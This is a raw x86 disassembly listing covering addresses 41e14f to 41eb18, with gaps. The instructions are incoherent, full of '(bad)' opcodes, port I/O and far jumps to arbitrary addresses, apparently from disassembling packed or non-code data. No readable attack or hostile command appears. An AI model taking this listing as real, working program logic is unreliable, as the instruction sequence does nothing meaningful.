  41e14f:	xor    eax,0x5a0f8122
  41e154:	sbb    esp,ebx
  41e156:	jae    0x41e194
  41e158:	ja     0x41e16c
  41e15a:	call   0x3ea61094
  41e15f:	mov    al,ds:0x88ccc8bd
  41e164:	repz inc ebx
  41e166:	sahf   
  41e167:	jne    0x41e100
  41e169:	out    dx,al
  41e16a:	cs xchg edx,eax
  41e16c:	pop    esp
  41e16d:	inc    ebp
  41e16e:	cmc    
  41e16f:	fdivrp st(5),st
  41e171:	out    dx,eax
  41e172:	(bad)  
  41e173:	jmp    0x41e1cc
  41e175:	xchg   ecx,eax
  41e176:	xor    BYTE PTR [esi+0x4e32a241],bh
  41e17c:	push   eax
  41e17d:	fist   DWORD PTR [edi]
  41e17f:	sub    esp,DWORD PTR [edi+0xd747e7e]
  41e185:	int    0x63
  41e187:	xor    DWORD PTR [ebp-0x7c],eax
  41e18a:	cmp    BYTE PTR ds:[ecx+0x57],ah
  41e18e:	and    eax,0xbd71ed26
  41e193:	xchg   esi,ebx
  41e195:	inc    ecx
  41e196:	xchg   esp,eax
  41e197:	jno    0x41e1eb
  41e199:	loopne 0x41e163
  41e19b:	inc    esp
  41e19c:	pop    ecx
  41e19d:	xor    eax,0xd4280248
  41e1a2:	test   eax,0xa4857252
  41e1a7:	imul   ecx,DWORD PTR [esi],0x6e
  41e1aa:	test   al,0x2d
  41e1ac:	pusha  
  41e1ad:	mov    ebp,0xbe4be62c
  41e1b2:	retf   
  41e1b3:	rcl    BYTE PTR [ecx],cl
	...
  41e215:	add    BYTE PTR [ebx-0x1988fe],ch
  41e21b:	idiv   DWORD PTR [ebx-0xf75b5b1]
  41e221:	mov    ecx,DWORD PTR [ebx]
  41e223:	or     eax,0x3ee89f83
  41e228:	add    DWORD PTR [eax],eax
  41e22a:	pop    es
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edi+0x49],dl
  41e230:	sub    esi,esp
  41e232:	imul   ecx,DWORD PTR [edx-0x453c0b7e],0x40
  41e239:	call   0x88b48df7
  41e23e:	sti    
  41e23f:	stos   BYTE PTR es:[edi],al
  41e240:	sub    ecx,DWORD PTR [eax]
  41e242:	jno    0x41e292
  41e244:	pop    esi
  41e245:	iret   
  41e246:	sbb    DWORD PTR [esi+0x70],ecx
  41e249:	outs   dx,DWORD PTR ds:[esi]
  41e24a:	not    BYTE PTR [eax-0x2f1a94d8]
  41e250:	xchg   ecx,eax
  41e251:	inc    edx
  41e252:	pop    es
  41e253:	repz or al,0x1d
  41e256:	mov    ds,WORD PTR [edx+ecx*4-0x4457c99b]
  41e25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e25e:	lods   al,BYTE PTR ds:[esi]
  41e25f:	sbb    dh,ch
  41e261:	inc    ecx
  41e262:	pop    es
  41e263:	out    dx,eax
  41e264:	gs in  al,dx
  41e266:	stc    
  41e267:	jb     0x41e22e
  41e269:	pop    esi
  41e26a:	in     al,0xd6
  41e26c:	and    DWORD PTR [eax-0x1d],eax
  41e26f:	sbb    BYTE PTR [edx+0x46de2a54],ah
  41e275:	lahf   
  41e276:	mov    bl,0xac
  41e278:	in     al,0xd7
  41e27a:	sti    
  41e27b:	push   es
  41e27c:	lods   eax,DWORD PTR ds:[esi]
  41e27d:	adc    ah,BYTE PTR [edi+eiz*8+0x3d]
  41e281:	test   eax,ecx
  41e283:	or     esp,DWORD PTR [ebp+0x16]
  41e286:	push   ss
  41e287:	sbb    eax,0x718ad20a
  41e28c:	sbb    al,0x58
  41e28e:	(bad)  
  41e28f:	shl    ebp,1
  41e291:	sub    DWORD PTR [esi-0x46],eax
  41e294:	mov    ?,WORD PTR [ebx+0x10]
  41e297:	retf   
  41e298:	add    BYTE PTR [edx+0x3f665216],ch
  41e29e:	mov    al,0xa1
  41e2a0:	inc    edx
  41e2a1:	push   cs
  41e2a2:	mov    ebp,0xc7a3224d
  41e2a7:	test   DWORD PTR [ebx-0x6e85959d],esp
  41e2ad:	leave  
  41e2ae:	mov    eax,ds:0xfbcfbe43
  41e2b3:	stos   BYTE PTR es:[edi],al
  41e2b4:	and    ebx,edx
  41e2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2b7:	cli    
  41e2b8:	sahf   
  41e2b9:	pop    ebp
  41e2ba:	add    eax,DWORD PTR [esi+ebx*1-0x5f5666e2]
  41e2c1:	inc    ecx
  41e2c2:	(bad)  
  41e2c3:	into   
  41e2c4:	scas   eax,DWORD PTR es:[edi]
  41e2c5:	cs mov ecx,0xaab8934e
  41e2cb:	push   ss
  41e2cc:	mov    ebx,0xf47028b
  41e2d1:	int3   
  41e2d2:	test   DWORD PTR [eax+eiz*8+0x52931c17],edi
  41e2d9:	sbb    ch,BYTE PTR [ecx]
  41e2db:	inc    esp
  41e2dc:	in     eax,0x87
  41e2de:	xchg   ebp,eax
  41e2df:	inc    ebx
  41e2e0:	mov    ?,WORD PTR [ebp+0x78]
  41e2e3:	fsub   QWORD PTR [eax]
  41e2e5:	mov    bl,0x2d
  41e2e7:	sbb    cl,bh
  41e2e9:	in     eax,0x39
  41e2eb:	aaa    
  41e2ec:	loopne 0x41e2e9
  41e2ee:	adc    ah,BYTE PTR [ebx-0x35]
  41e2f1:	fldenv [ebp-0xb]
  41e2f4:	fst    QWORD PTR [esi+0x20]
  41e2f7:	fist   DWORD PTR [ebx+0x6e1c091b]
  41e2fd:	adc    cl,bh
  41e2ff:	pusha  
  41e300:	sbb    dl,bl
  41e302:	cmp    al,0xf8
  41e304:	addr16 pushf 
  41e306:	shl    BYTE PTR [ebx],cl
  41e308:	or     dl,BYTE PTR [ecx]
  41e30a:	push   ss
  41e30b:	sub    edx,ecx
  41e30d:	mov    edi,0x718aee52
  41e312:	xor    al,0x37
  41e314:	or     DWORD PTR [edx+edx*4+0x444f0780],edx
  41e31b:	inc    esi
  41e31c:	jbe    0x41e363
  41e31e:	pop    edi
  41e31f:	pop    esi
  41e320:	cmp    DWORD PTR [ecx-0x5f590810],0xffffffdc
  41e327:	outs   dx,BYTE PTR ds:[esi]
  41e328:	inc    ecx
  41e329:	pop    ebp
  41e32a:	out    dx,eax
  41e32b:	loope  0x41e2bc
  41e32d:	sub    BYTE PTR [edx+edx*2],bl
  41e330:	into   
  41e331:	aas    
  41e332:	jne    0x41e2ee
  41e334:	xchg   ebx,eax
	...
  41e395:	add    BYTE PTR [ecx-0xe088ee],cl
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0xd204855
  41e3a3:	push   edx
  41e3a4:	rol    DWORD PTR [eax],cl
  41e3a6:	out    dx,eax
  41e3a7:	aas    
  41e3a8:	add    DWORD PTR [eax],eax
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    dl,bl
  41e3af:	mov    eax,DWORD PTR [eax]
  41e3b1:	cmp    BYTE PTR [edi+0x67],dl
  41e3b4:	mov    ebp,0xe0ec2d57
  41e3b9:	add    ebp,DWORD PTR ds:0x258c0679
  41e3bf:	pop    es
  41e3c0:	dec    ebx
  41e3c1:	mov    bl,0xc
  41e3c3:	aad    0xf3
  41e3c5:	std    
  41e3c6:	xor    dh,cl
  41e3c8:	in     eax,0x2
  41e3ca:	js     0x41e3e7
  41e3cc:	int    0xb8
  41e3ce:	dec    eax
  41e3cf:	mov    ds:0x40042859,al
  41e3d4:	loopne 0x41e362
  41e3d6:	fsub   QWORD PTR [esi]
  41e3d8:	add    dh,ah
  41e3da:	adc    BYTE PTR ds:0xcb76cfc8,cl
  41e3e0:	pop    edi
  41e3e1:	repnz pop esi
  41e3e3:	xor    DWORD PTR [eax+0x692d2930],esp
  41e3e9:	sub    cl,bh
  41e3eb:	dec    esi
  41e3ec:	shr    eax,0x95
  41e3ef:	xchg   ecx,eax
  41e3f0:	shr    BYTE PTR [eax-0x13],cl
  41e3f3:	mov    ds:0x2d4245ee,al
  41e3f8:	mul    DWORD PTR [eax-0xa4086d]
  41e3fe:	sub    DWORD PTR [eax+0x3f],eax
  41e401:	aam    0x20
  41e403:	fld    DWORD PTR [ebx]
  41e405:	jl     0x41e46f
  41e407:	push   ds
  41e408:	jns    0x41e44d
  41e40a:	pop    ebx
  41e40b:	(bad)  
  41e40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e40d:	cli    
  41e40e:	or     edi,edi
  41e410:	cli    
  41e411:	mov    ecx,0xa5bb1d11
  41e416:	mov    edx,0x134ecd3b
  41e41b:	dec    ebx
  41e41c:	arpl   si,bx
  41e41e:	in     al,dx
  41e41f:	out    dx,al
  41e420:	xor    edx,ecx
  41e422:	sbb    edx,DWORD PTR [ebp+0x3f]
  41e425:	out    dx,eax
  41e426:	pop    ebx
  41e427:	(bad)  
  41e429:	int    0xb9
  41e42b:	xchg   ebp,eax
  41e42c:	sbb    BYTE PTR [edi+0x3e],cl
  41e42f:	jp     0x41e492
  41e431:	fucomi st,st(5)
  41e433:	test   al,0xce
  41e435:	scas   al,BYTE PTR es:[edi]
  41e436:	and    al,BYTE PTR [esi+0x46]
  41e439:	push   cs
  41e43a:	into   
  41e43b:	ror    cl,1
  41e43d:	push   esp
  41e43e:	(bad)  
  41e43f:	push   cs
  41e440:	data16 scas al,BYTE PTR es:[edi]
  41e442:	mov    edx,0xa61cf75c
  41e447:	popf   
  41e448:	scas   al,BYTE PTR es:[edi]
  41e449:	or     al,al
  41e44b:	jmp    0xa41ff025
  41e450:	ss out dx,eax
  41e452:	pop    eax
  41e453:	rol    BYTE PTR [esi+0x77a6d949],1
  41e459:	jnp    0x41e42b
  41e45b:	lahf   
  41e45c:	test   BYTE PTR [eax+0x57],dh
  41e45f:	push   edi
  41e460:	scas   al,BYTE PTR es:[edi]
  41e461:	stos   DWORD PTR es:[edi],eax
  41e462:	sub    eax,0x60059c50
  41e467:	fwait
  41e468:	popa   
  41e469:	inc    esp
  41e46a:	add    BYTE PTR [edi-0x33ecd761],al
  41e470:	push   eax
  41e471:	scas   al,BYTE PTR es:[edi]
  41e472:	push   edx
  41e473:	je     0x41e4cc
  41e475:	fwait
  41e476:	popf   
  41e477:	in     al,dx
  41e478:	push   ecx
  41e479:	add    dl,al
  41e47b:	and    BYTE PTR [esi],ch
  41e47d:	pop    eax
  41e47e:	xor    BYTE PTR [eax-0x3acf3a81],ah
  41e484:	mov    ebp,0x799bcce
  41e489:	int    0x9c
  41e48b:	push   esi
  41e48c:	add    eax,0x7e61cf08
  41e491:	iret   
  41e492:	fsub   DWORD PTR [ebp-0x1]
  41e495:	add    eax,0xd03764d4
  41e49a:	xchg   edi,eax
  41e49b:	lahf   
  41e49c:	sbb    esp,DWORD PTR [eax+0x2f3dc3a8]
  41e4a2:	pop    ss
  41e4a3:	add    ch,ah
  41e4a5:	daa    
  41e4a6:	ja     0x41e45f
  41e4a8:	fidiv  DWORD PTR [eax]
  41e4aa:	cmp    al,0x71
  41e4ac:	xchg   edi,ecx
  41e4ae:	out    dx,eax
  41e4af:	je     0x41e457
  41e4b1:	rol    dh,1
  41e4b3:	out    0x64,al
	...
  41e515:	add    BYTE PTR [eax],ah
  41e517:	push   0xffffffcb
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	ds out 0x7c,al
  41e525:	arpl   si,si
  41e527:	inc    eax
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [esi+esi*2-0x33d9c6d],dh
  41e534:	fdiv   QWORD PTR ds:0xf05e4bd8
  41e53a:	lahf   
  41e53b:	fcmovu st,st(6)
  41e53d:	leave  
  41e53e:	xor    BYTE PTR [edi+0x1b],dh
  41e541:	sbb    al,0x5b
  41e543:	fsubr  QWORD PTR [ecx]
  41e545:	(bad)  
  41e546:	je     0x41e5a8
  41e548:	call   0x4c0de57f
  41e54d:	ds push ebx
  41e54f:	shl    DWORD PTR [edi],0xf4
  41e552:	adc    esi,DWORD PTR [edx-0x4f]
  41e555:	jp     0x41e507
  41e557:	pop    ebp
  41e558:	pushf  
  41e559:	cld    
  41e55a:	pop    DWORD PTR ds:[edi-0x50b82167]
  41e561:	pop    ds
  41e562:	jg     0x41e52e
  41e564:	jnp    0x41e5e3
  41e566:	lods   eax,DWORD PTR ds:[esi]
  41e567:	xchg   edx,eax
  41e568:	jne    0x41e564
  41e56a:	pop    es
  41e56b:	sub    bh,BYTE PTR [edi-0x663a36d8]
  41e571:	cmp    DWORD PTR [ebx],0xffffff9e
  41e574:	mov    al,ds:0xe875f8cf
  41e579:	or     eax,0xb5950b9b
  41e57e:	mov    dl,BYTE PTR [esi-0x71a36b00]
  41e584:	dec    esp
  41e585:	sbb    BYTE PTR [ecx],bl
  41e587:	xor    eax,0xd9a9f388
  41e58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e58d:	mov    dl,BYTE PTR [edi+edi*8+0x4e]
  41e591:	jb     0x41e5f5
  41e593:	sbb    eax,0x6787b277
  41e598:	(bad)  
  41e599:	cmp    ebx,DWORD PTR [eax+0x5c]
  41e59c:	pop    esp
  41e59d:	cwde   
  41e59e:	int3   
  41e59f:	lods   eax,DWORD PTR ds:[esi]
  41e5a0:	mov    edx,0xcd29c02d
  41e5a5:	dec    esp
  41e5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5a7:	clc    
  41e5a8:	scas   al,BYTE PTR es:[edi]
  41e5a9:	icebp  
  41e5aa:	sbb    BYTE PTR [ebx+0x4a],ch
  41e5ad:	cs pop ds
  41e5af:	cwde   
  41e5b0:	pop    ecx
  41e5b1:	cmc    
  41e5b2:	test   BYTE PTR [ebx+0x72],0x1b
  41e5b6:	inc    esp
  41e5b7:	ins    DWORD PTR es:[edi],dx
  41e5b8:	fisub  DWORD PTR [esi+ecx*1-0x8f57c38]
  41e5bf:	push   edx
  41e5c0:	sbb    ebx,DWORD PTR [edx]
  41e5c2:	mov    edx,0x3ee22dc1
  41e5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5c8:	popa   
  41e5c9:	mov    cl,0x54
  41e5cb:	sub    eax,0x3a37cf9a
  41e5d0:	test   ebp,esp
  41e5d2:	arpl   WORD PTR [ebx-0x7c303fd1],dx
  41e5d8:	sti    
  41e5d9:	sbb    ebp,DWORD PTR [eax-0x3]
  41e5dc:	adc    eax,0xa10c1104
  41e5e1:	cmp    BYTE PTR [ebp+0x59],bh
  41e5e4:	xchg   esi,eax
  41e5e5:	les    edx,FWORD PTR [ebx-0x7b]
  41e5e8:	sbb    al,0x9c
  41e5ea:	or     ecx,DWORD PTR [edx-0x1ce4b20]
  41e5f0:	push   ds
  41e5f1:	ins    DWORD PTR es:[edi],dx
  41e5f2:	sbb    al,0xf
  41e5f4:	sahf   
  41e5f5:	outs   dx,BYTE PTR ds:[esi]
  41e5f6:	call   0x22f7:0x7e877a16
  41e5fd:	xlat   BYTE PTR ds:[ebx]
  41e5fe:	mov    edx,0x1689b4a4
  41e603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e604:	(bad)  
  41e605:	jl     0x41e658
  41e607:	inc    ecx
  41e608:	jnp    0x41e681
  41e60a:	inc    esp
  41e60b:	rol    BYTE PTR [esi+eiz*8+0x6d],cl
  41e60f:	jns    0x41e5fb
  41e611:	xor    BYTE PTR [esi],0x14
  41e614:	and    al,cl
  41e616:	add    eax,0xbc06e2a0
  41e61b:	mov    al,ds:0x2b2f8191
  41e620:	mov    bl,dl
  41e622:	push   ds
  41e623:	push   es
  41e624:	xor    BYTE PTR [edx-0x6a827074],bl
  41e62a:	fcmovbe st,st(4)
  41e62c:	je     0x41e63d
  41e62e:	fs sahf 
  41e630:	pop    ebx
  41e631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e632:	gs fwait
  41e634:	mov    eax,DWORD PTR [eax]
	...
  41e696:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e69c:	cmc    
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0x6dcb6abe,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [ebp-0x419d0b9],bh
  41e6b3:	mov    ds:0x277e7e25,eax
  41e6b8:	out    dx,al
  41e6b9:	or     DWORD PTR [esi-0x27],ebp
  41e6bc:	mov    al,cs:0xd70ad37d
  41e6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6c3:	pop    ebp
  41e6c4:	inc    edx
  41e6c5:	mov    ebx,0x763a77b2
  41e6ca:	jb     0x41e69a
  41e6cc:	add    eax,0xde4444b0
  41e6d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d2:	dec    edx
  41e6d3:	jl     0x41e66b
  41e6d5:	in     eax,0xf2
  41e6d7:	loop   0x41e73c
  41e6d9:	mov    ds:0xac8350c0,al
  41e6de:	mov    ebx,0xfa2c84d7
  41e6e3:	rcl    BYTE PTR [ebx+0x20],1
  41e6e6:	test   al,0x44
  41e6e8:	outs   dx,BYTE PTR ds:[esi]
  41e6e9:	dec    esi
  41e6ea:	xchg   edx,eax
  41e6eb:	fiadd  WORD PTR [ecx+edi*1]
  41e6ee:	inc    edi
  41e6ef:	ja     0x41e751
  41e6f1:	neg    DWORD PTR [ecx-0x26]
  41e6f4:	rcr    BYTE PTR [esi+0x4539adbc],0x43
  41e6fb:	out    dx,al
  41e6fc:	dec    esp
  41e6fd:	in     al,dx
  41e6fe:	sbb    al,0x95
  41e700:	call   0x2969:0xec871428
  41e707:	mov    bl,0xf8
  41e709:	inc    edx
  41e70a:	fistp  QWORD PTR [esi]
  41e70c:	xchg   esp,eax
  41e70d:	ja     0x41e706
  41e70f:	sbb    BYTE PTR [edi-0x12],al
  41e712:	into   
  41e713:	mov    esp,0x2fa296e5
  41e718:	call   0x4dd8:0xe24c5a7f
  41e71f:	mov    ebx,0xd054a881
  41e724:	in     al,dx
  41e725:	sbb    DWORD PTR [ecx],esi
  41e727:	mov    ebp,0xb2c2b9a4
  41e72c:	pop    ss
  41e72d:	aad    0x4a
  41e72f:	mov    esp,0x12eadf9d
  41e734:	popa   
  41e735:	jbe    0x41e741
  41e737:	inc    edi
  41e738:	or     eax,0x5e3d1c8f
  41e73d:	push   cs
  41e73e:	xchg   edi,eax
  41e73f:	jmp    0x69c35683
  41e744:	pop    esp
  41e745:	dec    esp
  41e746:	imul   esi,DWORD PTR [edx+0x1cadfb7c],0x385c0215
  41e750:	shr    DWORD PTR [esi-0x35e3c2f9],0xb2
  41e757:	cmc    
  41e758:	or     al,0xcc
  41e75a:	stc    
  41e75b:	and    esi,DWORD PTR ds:0xc26ba8e0
  41e761:	sbb    bh,BYTE PTR [ebx+0x3caa67f3]
  41e767:	jne    0x41e6ef
  41e769:	ds mov ebx,0x9bb50705
  41e76f:	lfs    ebx,FWORD PTR [ebx+eiz*4+0x76631574]
  41e777:	pop    esi
  41e779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e77a:	ds data16 ss aaa 
  41e77e:	pop    es
  41e77f:	cdq    
  41e780:	test   dl,dl
  41e782:	ficomp DWORD PTR [ebx]
  41e784:	fwait
  41e785:	add    edx,DWORD PTR [edi+0x3a]
  41e788:	imul   edx,DWORD PTR [esi+esi*8],0xffffffb6
  41e78c:	aaa    
  41e78d:	daa    
  41e78e:	dec    esp
  41e78f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e790:	or     bh,ah
  41e792:	and    dl,BYTE PTR [edi-0x65b8631d]
  41e798:	call   0x7d64a271
  41e79d:	cmp    al,0x9e
  41e79f:	pop    ebx
  41e7a0:	in     al,dx
  41e7a1:	push   0x758be3b
  41e7a6:	(bad)  
  41e7a7:	cmp    DWORD PTR [ecx-0x41b3c6f],ebp
  41e7ad:	fist   DWORD PTR ds:0x3e595f29
  41e7b3:	mov    ds:0x8a,al
	...
  41e814:	add    BYTE PTR [eax],al
  41e816:	sub    eax,0x9e5c8a39
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0x46
  41e823:	and    al,0x7
  41e825:	fadd   QWORD PTR [ebx+eax*2]
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    BYTE PTR [eax+edi*1-0x6e0d984e],al
  41e834:	cmp    DWORD PTR [esi+0x2be89771],edi
  41e83a:	xlat   BYTE PTR ds:[ebx]
  41e83b:	xchg   ebx,eax
  41e83c:	sub    bl,dl
  41e83e:	mov    cl,dl
  41e840:	stc    
  41e841:	outs   dx,BYTE PTR ds:[esi]
  41e842:	push   ss
  41e843:	into   
  41e844:	bound  ebp,QWORD PTR [ebp-0x47]
  41e847:	sbb    edx,DWORD PTR [ebx+esi*2]
  41e84a:	push   ebx
  41e84b:	aaa    
  41e84c:	jge    0x41e8ac
  41e84e:	mov    dh,0x2b
  41e850:	aas    
  41e851:	xchg   esi,eax
  41e852:	pop    edi
  41e853:	shr    DWORD PTR [ecx-0x1f],0x8
  41e857:	mov    esp,0x7d439dca
  41e85c:	and    esp,DWORD PTR [ebx-0x5768de3e]
  41e862:	jae    0x41e8b3
  41e864:	lock jne 0x41e8b1
  41e867:	pop    es
  41e868:	inc    ecx
  41e869:	test   ecx,esi
  41e86b:	inc    esi
  41e86c:	ror    DWORD PTR [edi],1
  41e86e:	(bad)  
  41e86f:	in     al,dx
  41e870:	sub    ch,bh
  41e872:	cwde   
  41e873:	pushf  
  41e874:	jns    0x41e8da
  41e876:	or     al,0x17
  41e878:	xchg   ebp,eax
  41e879:	imul   eax,esi,0x46098544
  41e87f:	rcl    ah,cl
  41e881:	push   eax
  41e882:	mov    ch,0x55
  41e884:	mov    eax,0x6c973c9f
  41e889:	cmp    eax,0xe520b00c
  41e88e:	ins    BYTE PTR es:[edi],dx
  41e88f:	repnz test DWORD PTR [ebx+0x7b2746bf],ebp
  41e896:	push   ss
  41e897:	sub    cl,BYTE PTR [edi+0x67]
  41e89a:	xchg   esp,eax
  41e89b:	enter  0x1249,0xa
  41e89f:	shl    esp,1
  41e8a1:	arpl   WORD PTR [edi-0x5d],dx
  41e8a4:	and    esp,eax
  41e8a6:	mov    esp,0xae376a97
  41e8ab:	push   ds
  41e8ac:	push   ebx
  41e8ad:	mov    ah,0x75
  41e8af:	fwait
  41e8b0:	out    0xce,al
  41e8b2:	stc    
  41e8b3:	mov    DWORD PTR [ebp-0x376eb142],esp
  41e8b9:	cmc    
  41e8ba:	push   ss
  41e8bb:	xchg   esi,eax
  41e8bc:	or     dh,BYTE PTR [ebp+eax*1+0x54]
  41e8c0:	(bad)  
  41e8c1:	call   0x4bb38689
  41e8c6:	mov    ah,0x39
  41e8c8:	mov    al,ds:0x9b33f968
  41e8cd:	xchg   BYTE PTR [edx],bl
  41e8cf:	xor    ah,BYTE PTR [esi+0x4e]
  41e8d2:	in     al,0x7c
  41e8d4:	out    0x57,eax
  41e8d6:	(bad)  
  41e8d7:	cmp    BYTE PTR [edi],cl
  41e8d9:	scas   eax,DWORD PTR es:[edi]
  41e8da:	popf   
  41e8db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8dc:	test   BYTE PTR [edx],ah
  41e8de:	adc    al,0x48
  41e8e0:	push   cs
  41e8e1:	mov    ebx,DWORD PTR [edx+esi*4]
  41e8e4:	fadd   QWORD PTR [edx]
  41e8e6:	pop    esp
  41e8e7:	dec    edi
  41e8e8:	xchg   esp,eax
  41e8e9:	mov    ecx,eax
  41e8eb:	ret    0xb81f
  41e8ee:	mov    ds:0x86160f40,al
  41e8f3:	bound  eax,QWORD PTR [edx+0x30d2229f]
  41e8f9:	fdiv   DWORD PTR [ebp-0x5d]
  41e8fc:	nop
  41e8fd:	in     al,dx
  41e8fe:	inc    eax
  41e8ff:	call   DWORD PTR [ebx-0x1cacb4ef]
  41e905:	xchg   ebx,eax
  41e906:	popf   
  41e907:	jl     0x41e8fa
  41e909:	sti    
  41e90a:	cmp    ch,0x1d
  41e90d:	adc    al,BYTE PTR [esi+eax*8]
  41e910:	sub    dl,BYTE PTR [edx+0x4e0579a6]
  41e916:	or     eax,DWORD PTR [edx-0x52b284c7]
  41e91c:	mov    edi,0x57f988a7
  41e921:	rol    esp,1
  41e923:	orps   xmm6,XMMWORD PTR [eax]
  41e926:	fcom   QWORD PTR [ecx-0x48]
  41e929:	cmp    ah,BYTE PTR [edx-0x33]
  41e92c:	aam    0xa5
  41e92e:	repz dec ebp
  41e930:	push   0xb52200aa
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	add    al,0x86
  41e9a4:	fsubr  QWORD PTR [ebx+ecx*1+0x7000144]
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [esi-0x68],al
  41e9b0:	ret    0x566e
  41e9b3:	shl    BYTE PTR [esi+0x19e125ad],1
  41e9b9:	xchg   edi,eax
  41e9ba:	rol    esp,1
  41e9bc:	out    0x6f,eax
  41e9be:	adc    edi,eax
  41e9c0:	jge    0x41e9a8
  41e9c2:	add    ah,ah
  41e9c4:	call   0xa51b:0x7673193
  41e9cb:	jecxz  0x41e9cf
  41e9cd:	or     DWORD PTR [ebx-0x19],0x798e4bcb
  41e9d4:	jmp    0xea79:0x6839d7f8
  41e9db:	jns    0x41ea22
  41e9dd:	mov    ah,0xa3
  41e9df:	ins    BYTE PTR es:[edi],dx
  41e9e0:	cli    
  41e9e1:	pop    edx
  41e9e2:	int3   
  41e9e3:	out    dx,eax
  41e9e4:	in     al,dx
  41e9e5:	fcomip st,st(5)
  41e9e7:	push   ss
  41e9e8:	inc    edx
  41e9e9:	push   ebp
  41e9ea:	(bad)  
  41e9eb:	jp     0x41e991
  41e9ed:	cmp    ah,dh
  41e9ef:	popf   
  41e9f0:	sub    dl,bl
  41e9f2:	xchg   ecx,eax
  41e9f3:	jno    0x41e9bc
  41e9f5:	cld    
  41e9f6:	adc    ebp,DWORD PTR ds:0x4ef9cb44
  41e9fc:	addr16 push ss
  41e9fe:	push   edi
  41e9ff:	adc    al,0x13
  41ea01:	pop    ebp
  41ea02:	mov    eax,ds:0x721a0dc
  41ea07:	xor    eax,0x4b26741b
  41ea0c:	sbb    esp,edi
  41ea0e:	cmp    bh,ch
  41ea10:	fwait
  41ea11:	icebp  
  41ea12:	xchg   esi,eax
  41ea13:	popf   
  41ea14:	jns    0x41ea88
  41ea16:	jecxz  0x41ea44
  41ea18:	test   DWORD PTR [edi+0x55b3d4fb],0x1bec998b
  41ea22:	dec    edi
  41ea23:	aad    0x1d
  41ea25:	outs   dx,DWORD PTR ds:[esi]
  41ea26:	repz cmp al,0x41
  41ea29:	sub    DWORD PTR es:[eax],eax
  41ea2c:	shr    bh,1
  41ea2e:	stos   DWORD PTR es:[edi],eax
  41ea2f:	dec    ecx
  41ea30:	icebp  
  41ea31:	add    DWORD PTR [edx+0x11],edx
  41ea34:	shl    DWORD PTR [esi-0xc9d775d],0xbb
  41ea3b:	jp     0x41ea84
  41ea3d:	sub    al,0x3d
  41ea3f:	inc    esi
  41ea40:	pop    ebp
  41ea41:	mov    WORD PTR [edx],fs
  41ea43:	inc    ebx
  41ea44:	xchg   esp,eax
  41ea45:	push   0x8e80d7bc
  41ea4a:	and    esp,DWORD PTR [edx+0x5]
  41ea4d:	add    ch,BYTE PTR [eax+0x75]
  41ea50:	mov    cl,0xf1
  41ea52:	xor    esi,0x3e
  41ea55:	pop    esi
  41ea56:	pushf  
  41ea57:	data16 data16 test BYTE PTR [esi],ch
  41ea5b:	pop    edi
  41ea5c:	test   DWORD PTR [ebp+0x4f6e922a],ebx
  41ea62:	dec    edx
  41ea63:	fs jge 0x41ea81
  41ea66:	test   ch,0x42
  41ea69:	mov    ah,0x10
  41ea6b:	xor    BYTE PTR [edx+0x394a55fd],ah
  41ea71:	xchg   ebp,eax
  41ea72:	retf   0xcebf
  41ea75:	dec    edi
  41ea76:	jmp    0x13f6f53e
  41ea7b:	les    ebx,FWORD PTR [edi+0x6c6cca4a]
  41ea81:	pop    esi
  41ea82:	mov    ds:0xb496f764,al
  41ea87:	push   edx
  41ea88:	push   eax
  41ea89:	sti    
  41ea8a:	mov    cl,0xc3
  41ea8c:	push   eax
  41ea8d:	cli    
  41ea8e:	mov    eax,ds:0xc2269125
  41ea93:	dec    ebx
  41ea94:	scas   al,BYTE PTR es:[edi]
  41ea95:	mov    eax,0x97cdebb6
  41ea9a:	and    al,bh
  41ea9c:	stos   DWORD PTR es:[edi],eax
  41ea9d:	xchg   ecx,eax
  41ea9e:	mov    ebx,0x51396426
  41eaa3:	or     cl,BYTE PTR [edi]
  41eaa5:	pop    edx
  41eaa6:	outs   dx,DWORD PTR ds:[esi]
  41eaa7:	std    
  41eaa8:	xchg   edi,eax
  41eaa9:	mov    ds:0xadc6a699,al
  41eaae:	fcomip st,st(4)
  41eab0:	xchg   ebp,eax
  41eab1:	stc    
  41eab2:	pop    edi
  41eab3:	mov    al,0x31
	...
  41eb15:	add    BYTE PTR [edx],dl
  41eb17:	das    
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
